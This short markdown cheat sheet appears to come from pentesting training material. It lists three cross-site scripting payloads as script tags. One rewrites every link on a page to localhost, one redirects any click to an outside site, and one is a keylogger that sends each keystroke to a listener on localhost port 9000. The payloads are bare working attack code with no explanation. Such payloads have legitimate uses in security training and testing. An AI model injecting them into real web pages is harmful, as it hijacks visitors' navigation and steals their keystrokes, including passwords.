## href change
```js
<script>for(let i of document.getElementsByTagName("a"))i.href="http://localhost"</script>
```


## event
``` js
<script>document.body.addEventListener('click',event=>{location.href="http://PentesterAcademy.com"});</script>
```
## keylogger
```js
<script>window.addEventListener("keydown",event=>{new Image().src="http://localhost:9000/?kedown="+event.key;})</script>
```
